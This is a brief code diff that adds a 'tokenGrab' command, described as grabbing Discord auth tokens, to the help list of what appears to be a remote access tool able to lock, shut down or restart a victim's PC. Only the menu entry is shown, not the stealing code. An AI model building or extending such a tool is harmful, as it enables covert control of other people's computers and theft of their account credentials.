@@ -26,6 +26,7 @@ commands = [
     ["lock", "Puts the client user back to the login screen"],
     ["shutdown", "Shutsdown the client users PC, will close connection"],
     ["restart", "Restarts the client users PC"],
+    ["tokenGrab", "Grabs discord auth tokens"],
     ["ratHelp", "Displays this list"],
 ]
 
